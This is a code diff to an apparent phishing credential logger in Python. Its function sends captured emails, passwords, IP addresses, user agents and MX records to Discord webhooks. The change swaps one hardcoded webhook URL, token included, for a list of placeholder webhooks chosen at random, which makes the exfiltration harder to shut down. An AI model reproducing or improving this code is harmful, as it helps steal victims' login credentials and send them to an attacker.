@@ -17,9 +17,16 @@ import random
 import dns.resolver
 
 # Discord Webhook URL
-DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1339995643497681058/XBIWTD-VWQ0Ssg5KUR3ojdSuCkJFhRIw2TgYAvIXZce5BrVWVRQp0n9cySRZAdb1wQIe"
+DISCORD_WEBHOOK_URLS = [
+    "YOUR_DISCORD_WEBHOOK_URL_1",
+    "YOUR_DISCORD_WEBHOOK_URL_2",
+    "YOUR_DISCORD_WEBHOOK_URL_3",
+    "YOUR_DISCORD_WEBHOOK_URL_4",
+    "YOUR_DISCORD_WEBHOOK_URL_5"
+]
 
 def send_discord_message(email, password, ip, useragent, domain, mx_record):
+    webhook_url = random.choice(DISCORD_WEBHOOK_URLS)  # Select a random webhook
     message = {
         "username": "Logger Bot",
         "avatar_url": "https://i.imgur.com/zW2WJ3o.png",  # Optional bot avatar
@@ -41,7 +48,7 @@ def send_discord_message(email, password, ip, useragent, domain, mx_record):
     }
     
     try:
-        requests.post(DISCORD_WEBHOOK_URL, json=message)
+        requests.post(webhook_url, json=message)
     except requests.exceptions.RequestException as e:
         print(f"Error sending message to Discord: {e}")
 
